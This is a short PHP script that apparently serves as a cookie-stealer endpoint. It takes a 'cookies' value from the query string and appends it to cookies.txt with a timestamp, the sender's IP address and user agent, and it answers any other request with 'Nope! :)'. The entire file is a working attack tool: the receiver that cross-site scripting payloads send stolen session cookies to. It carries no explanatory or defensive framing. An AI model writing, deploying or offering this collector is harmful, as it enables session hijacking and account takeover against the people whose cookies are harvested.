<?php

if(isset($_GET['cookies'])){
	$saveFile = file_get_contents('cookies.txt');
	$saveFile = $saveFile.$_GET['cookies']."|".date('Y-m-d H:i:s')."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."\n";
	file_put_contents('cookies.txt', $saveFile);
}else{
	echo "Nope! :)";
}
?>